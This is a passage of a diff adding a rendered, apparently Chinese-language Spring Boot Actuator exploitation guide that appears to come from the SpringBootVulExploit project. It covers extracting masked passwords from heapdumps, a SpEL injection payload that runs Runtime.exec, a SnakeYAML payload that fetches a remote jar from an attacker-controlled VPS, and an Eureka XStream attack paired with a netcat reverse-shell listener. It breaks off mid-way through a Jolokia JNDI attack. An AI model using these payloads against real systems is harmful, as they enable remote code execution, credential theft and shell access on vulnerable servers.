+&lt;p&gt;GET 请求目标网站的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/env&lt;/code&gt; 或 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/actuator/env&lt;/code&gt; 接口，搜索 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;******&lt;/code&gt; 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。&lt;/p&gt;
+
+&lt;h5 id=&quot;步骤二-下载-jvm-heap-信息&quot;&gt;步骤二： 下载 jvm heap 信息&lt;/h5&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;下载的 heapdump 文件大小通常在 50M—500M 之间，有时候也可能会大于 2G&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GET&lt;/code&gt; 请求目标的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/heapdump&lt;/code&gt; 或 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/actuator/heapdump&lt;/code&gt; 接口，下载应用实时的 JVM 堆信息&lt;/p&gt;
+
+&lt;h5 id=&quot;步骤三-使用-mat-获得-jvm-heap-中的密码明文&quot;&gt;步骤三： 使用 MAT 获得 jvm heap 中的密码明文&lt;/h5&gt;
+
+&lt;p&gt;参考 &lt;a href=&quot;https://landgrey.me/blog/16/&quot;&gt;文章&lt;/a&gt; 方法，使用 &lt;a href=&quot;https://www.eclipse.org/mat/downloads.php&quot;&gt;Eclipse Memory Analyzer&lt;/a&gt; 工具的 OQL 语句 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;select * from org.springframework.web.context.support.StandardServletEnvironment&lt;/code&gt;， 辅助快速过滤分析，获得密码明文&lt;/p&gt;
+
+&lt;h2 id=&quot;二远程代码执行&quot;&gt;二：远程代码执行&lt;/h2&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;由于 spring boot 相关漏洞可能是多个组件漏洞组合导致的，所以有些漏洞名字起的不太正规，以能区分为准&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;0x01whitelabel-error-page-spel-rce&quot;&gt;0x01：whitelabel error page SpEL RCE&lt;/h3&gt;
+
+&lt;h4 id=&quot;利用条件-4&quot;&gt;利用条件：&lt;/h4&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;spring boot 1.1.0-1.1.12、1.2.0-1.2.7、1.3.0&lt;/li&gt;
+  &lt;li&gt;至少知道一个触发 springboot 默认错误页面的接口及参数名&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h4 id=&quot;利用方法-4&quot;&gt;利用方法：&lt;/h4&gt;
+
+&lt;h5 id=&quot;步骤一找到一个正常传参处&quot;&gt;步骤一：找到一个正常传参处&lt;/h5&gt;
+
+&lt;p&gt;比如发现访问  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/article?id=xxx&lt;/code&gt; ，页面会报状态码为 500 的错误： &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Whitelabel Error Page&lt;/code&gt;，则后续 payload 都将会在参数 id 处尝试。&lt;/p&gt;
+
+&lt;h5 id=&quot;步骤二执行-spel-表达式&quot;&gt;步骤二：执行 SpEL 表达式&lt;/h5&gt;
+
+&lt;p&gt;输入 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/article?id=${7*7}&lt;/code&gt; ，如果发现报错页面将 7*7 的值 49 计算出来显示在报错页面上，那么基本可以确定目标存在 SpEL 表达式注入漏洞。&lt;/p&gt;
+
+&lt;p&gt;由字符串格式转换成 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x**&lt;/code&gt; java 字节形式，方便执行任意代码：&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# coding: utf-8
+&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'open -a Calculator'&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;,&quot;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rstrip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;','&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;执行 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;open -a Calculator&lt;/code&gt; 命令&lt;/p&gt;
+
+&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;T&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;java&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;lang&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;Runtime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getRuntime&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]{&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x6f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x70&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x65&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x6e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x20&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x2d&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x61&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x20&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x43&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x61&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x6c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x63&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x75&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x6c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x61&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x74&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x6f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x72&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}))}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;漏洞原理&quot;&gt;漏洞原理：&lt;/h4&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;spring boot 处理参数值出错，流程进入 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;org.springframework.util.PropertyPlaceholderHelper&lt;/code&gt; 类中&lt;/li&gt;
+  &lt;li&gt;此时 URL 中的参数值会用 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;parseStringValue&lt;/code&gt; 方法进行递归解析&lt;/li&gt;
+  &lt;li&gt;其中  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;${}&lt;/code&gt;  包围的内容都会被 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration&lt;/code&gt; 类的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;resolvePlaceholder&lt;/code&gt; 方法当作 SpEL 表达式被解析执行，造成 RCE 漏洞&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h4 id=&quot;漏洞分析&quot;&gt;漏洞分析：&lt;/h4&gt;
+
+&lt;p&gt;​	&lt;a href=&quot;https://www.cnblogs.com/litlife/p/10183137.html&quot;&gt;SpringBoot SpEL表达式注入漏洞-分析与复现&lt;/a&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;漏洞环境&quot;&gt;漏洞环境：&lt;/h4&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-spel-rce&quot;&gt;repository/springboot-spel-rce&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;正常访问：&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://127.0.0.1:9091/article?id=66
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;执行 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;open -a Calculator&lt;/code&gt; 命令：&lt;/p&gt;
+
+&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nl&quot;&gt;http:&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//127.0.0.1:9091/article?id=${T(java.lang.Runtime).getRuntime().exec(new%20String(new%20byte[]{0x6f,0x70,0x65,0x6e,0x20,0x2d,0x61,0x20,0x43,0x61,0x6c,0x63,0x75,0x6c,0x61,0x74,0x6f,0x72}))}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;0x02spring-cloud-snakeyaml-rce&quot;&gt;0x02：spring cloud SnakeYAML RCE&lt;/h3&gt;
+
+&lt;h4 id=&quot;利用条件-5&quot;&gt;利用条件：&lt;/h4&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;可以 POST 请求目标网站的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/env&lt;/code&gt; 接口设置属性&lt;/li&gt;
+  &lt;li&gt;可以 POST 请求目标网站的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/refresh&lt;/code&gt; 接口刷新配置（存在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;spring-boot-starter-actuator&lt;/code&gt; 依赖）&lt;/li&gt;
+  &lt;li&gt;目标依赖的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;spring-cloud-starter&lt;/code&gt; 版本 &amp;lt; 1.3.0.RELEASE&lt;/li&gt;
+  &lt;li&gt;目标可以请求攻击者的 HTTP 服务器（请求可出外网）&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h4 id=&quot;利用方法-5&quot;&gt;利用方法：&lt;/h4&gt;
+
+&lt;h5 id=&quot;步骤一-托管-yml-和-jar-文件&quot;&gt;步骤一： 托管 yml 和 jar 文件&lt;/h5&gt;
+
+&lt;p&gt;在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 使用 python 快速开启 http server&lt;/span&gt;
+
+python2 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; SimpleHTTPServer 80
+python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 80
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;在网站根目录下放置后缀为 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;yml&lt;/code&gt; 的文件  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;example.yml&lt;/code&gt;，内容如下：&lt;/p&gt;
+
+&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;!!javax.script.ScriptEngineManager&lt;/span&gt; &lt;span class=&quot;pi&quot;&gt;[&lt;/span&gt;
+  &lt;span class=&quot;kt&quot;&gt;!!java.net.URLClassLoader&lt;/span&gt; &lt;span class=&quot;pi&quot;&gt;[[&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;!!java.net.URL&lt;/span&gt; &lt;span class=&quot;pi&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;http://your-vps-ip/example.jar&quot;&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt;
+  &lt;span class=&quot;pi&quot;&gt;]]&lt;/span&gt;
+&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;在网站根目录下放置后缀为 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jar&lt;/code&gt; 的文件  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;example.jar&lt;/code&gt;，内容是要执行的代码，代码编写及编译方式参考 &lt;a href=&quot;https://github.com/artsploit/yaml-payload&quot;&gt;yaml-payload&lt;/a&gt;。&lt;/p&gt;
+
+&lt;h5 id=&quot;步骤二-设置-springcloudbootstraplocation-属性&quot;&gt;步骤二： 设置 spring.cloud.bootstrap.location 属性&lt;/h5&gt;
+
+&lt;p&gt;spring 1.x&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /env
+Content-Type: application/x-www-form-urlencoded
+
+spring.cloud.bootstrap.location=http://your-vps-ip/example.yml
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;spring 2.x&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /actuator/env
+Content-Type: application/json
+
+{&quot;name&quot;:&quot;spring.cloud.bootstrap.location&quot;,&quot;value&quot;:&quot;http://your-vps-ip/example.yml&quot;}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h5 id=&quot;步骤三-刷新配置&quot;&gt;步骤三： 刷新配置&lt;/h5&gt;
+
+&lt;p&gt;spring 1.x&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /refresh
+Content-Type: application/x-www-form-urlencoded
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;spring 2.x&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /actuator/refresh
+Content-Type: application/json
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;漏洞原理-1&quot;&gt;漏洞原理：&lt;/h4&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;spring.cloud.bootstrap.location 属性被设置为外部恶意 yml 文件 URL 地址&lt;/li&gt;
+  &lt;li&gt;refresh 触发目标机器请求远程 HTTP 服务器上的 yml 文件，获得其内容&lt;/li&gt;
+  &lt;li&gt;SnakeYAML 由于存在反序列化漏洞，所以解析恶意 yml 内容时会完成指定的动作&lt;/li&gt;
+  &lt;li&gt;先是触发 java.net.URL 去拉取远程 HTTP 服务器上的恶意 jar 文件&lt;/li&gt;
+  &lt;li&gt;然后是寻找 jar 文件中实现 javax.script.ScriptEngineFactory 接口的类并实例化&lt;/li&gt;
+  &lt;li&gt;实例化类时执行恶意代码，造成 RCE 漏洞&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h4 id=&quot;漏洞分析-1&quot;&gt;漏洞分析：&lt;/h4&gt;
+
+&lt;p&gt;​	&lt;a href=&quot;https://b1ngz.github.io/exploit-spring-boot-actuator-spring-cloud-env-note/&quot;&gt;Exploit Spring Boot Actuator 之 Spring Cloud Env 学习笔记&lt;/a&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;漏洞环境-1&quot;&gt;漏洞环境：&lt;/h4&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springcloud-snakeyaml-rce&quot;&gt;repository/springcloud-snakeyaml-rce&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;正常访问：&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://127.0.0.1:9092/env
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;0x03eureka-xstream-deserialization-rce&quot;&gt;0x03：eureka xstream deserialization RCE&lt;/h3&gt;
+
+&lt;h4 id=&quot;利用条件-6&quot;&gt;利用条件：&lt;/h4&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;可以 POST 请求目标网站的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/env&lt;/code&gt; 接口设置属性&lt;/li&gt;
+  &lt;li&gt;可以 POST 请求目标网站的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/refresh&lt;/code&gt; 接口刷新配置（存在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;spring-boot-starter-actuator&lt;/code&gt; 依赖）&lt;/li&gt;
+  &lt;li&gt;目标使用的  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;eureka-client&lt;/code&gt; &amp;lt; 1.8.7（通常包含在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;spring-cloud-starter-netflix-eureka-client&lt;/code&gt; 依赖中）&lt;/li&gt;
+  &lt;li&gt;目标可以请求攻击者的 HTTP 服务器（请求可出外网）&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h4 id=&quot;利用方法-6&quot;&gt;利用方法：&lt;/h4&gt;
+
+&lt;h5 id=&quot;步骤一架设响应恶意-xstream-payload-的网站&quot;&gt;步骤一：架设响应恶意 XStream payload 的网站&lt;/h5&gt;
+
+&lt;p&gt;提供一个依赖 Flask 并符合要求的 &lt;a href=&quot;https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-xstream-rce.py&quot;&gt;python 脚本示例&lt;/a&gt;，作用是利用目标 Linux 机器上自带的 python 来反弹shell。&lt;/p&gt;
+
+&lt;p&gt;使用 python 在自己控制的服务器上运行以上的脚本，并根据实际情况修改脚本中反弹 shell 的 ip 地址和 端口号。&lt;/p&gt;
+
+&lt;h5 id=&quot;步骤二监听反弹-shell-的端口&quot;&gt;步骤二：监听反弹 shell 的端口&lt;/h5&gt;
+
+&lt;p&gt;一般使用 nc 监听端口，等待反弹 shell&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc &lt;span class=&quot;nt&quot;&gt;-lvp&lt;/span&gt; 443
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h5 id=&quot;步骤三设置-eurekaclientserviceurldefaultzone-属性&quot;&gt;步骤三：设置 eureka.client.serviceUrl.defaultZone 属性&lt;/h5&gt;
+
+&lt;p&gt;spring 1.x&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /env
+Content-Type: application/x-www-form-urlencoded
+
+eureka.client.serviceUrl.defaultZone=http://your-vps-ip/example
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;spring 2.x&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /actuator/env
+Content-Type: application/json
+
+{&quot;name&quot;:&quot;eureka.client.serviceUrl.defaultZone&quot;,&quot;value&quot;:&quot;http://your-vps-ip/example&quot;}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h5 id=&quot;步骤四刷新配置&quot;&gt;步骤四：刷新配置&lt;/h5&gt;
+
+&lt;p&gt;spring 1.x&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /refresh
+Content-Type: application/x-www-form-urlencoded
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;spring 2.x&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /actuator/refresh
+Content-Type: application/json
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;漏洞原理-2&quot;&gt;漏洞原理：&lt;/h4&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;eureka.client.serviceUrl.defaultZone 属性被设置为恶意的外部 eureka server URL 地址&lt;/li&gt;
+  &lt;li&gt;refresh 触发目标机器请求远程 URL，提前架设的 fake eureka server 就会返回恶意的 payload&lt;/li&gt;
+  &lt;li&gt;目标机器相关依赖解析 payload，触发 XStream 反序列化，造成 RCE 漏洞&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h4 id=&quot;漏洞分析-2&quot;&gt;漏洞分析：&lt;/h4&gt;
+
+&lt;p&gt;​	&lt;a href=&quot;https://www.freebuf.com/column/234719.html&quot;&gt;Spring Boot Actuator从未授权访问到getshell&lt;/a&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;漏洞环境-2&quot;&gt;漏洞环境：&lt;/h4&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-eureka-xstream-rce&quot;&gt;repository/springboot-eureka-xstream-rce&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;正常访问：&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://127.0.0.1:9093/env
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;0x04jolokia-logback-jndi-rce&quot;&gt;0x04：jolokia logback JNDI RCE&lt;/h3&gt;
+
+&lt;h4 id=&quot;利用条件-7&quot;&gt;利用条件：&lt;/h4&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;目标网站存在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/jolokia&lt;/code&gt; 或 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/actuator/jolokia&lt;/code&gt; 接口&lt;/li&gt;
+  &lt;li&gt;目标使用了 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jolokia-core&lt;/code&gt; 依赖（版本要求暂未知）并且环境中存在相关 MBean&lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;目标可以请求攻击者的 HTTP 服务器（请求可出外网）&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;JNDI 注入受目标 JDK 版本影响，jdk &amp;lt; 6u201/7u191/8u182/11.0.1（LDAP 方式）&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h4 id=&quot;利用方法-7&quot;&gt;利用方法：&lt;/h4&gt;
+
+&lt;h5 id=&quot;步骤一查看已存在的-mbeans&quot;&gt;步骤一：查看已存在的 MBeans&lt;/h5&gt;
+
+&lt;p&gt;访问 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/jolokia/list&lt;/code&gt; 接口，查看是否存在 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ch.qos.logback.classic.jmx.JMXConfigurator&lt;/code&gt; 和 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;reloadByURL&lt;/code&gt; 关键词。&lt;/p&gt;
+
+&lt;h5 id=&quot;步骤二托管-xml-文件&quot;&gt;步骤二：托管 xml 文件&lt;/h5&gt;
+
+&lt;p&gt;在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# 使用 python 快速开启 http server&lt;/span&gt;
+
+python2 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; SimpleHTTPServer 80
+python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 80
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;在根目录放置以 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xml&lt;/code&gt; 结尾的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;example.xml&lt;/code&gt;  文件，内容如下：&lt;/p&gt;
+
+&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;configuration&amp;gt;&lt;/span&gt;
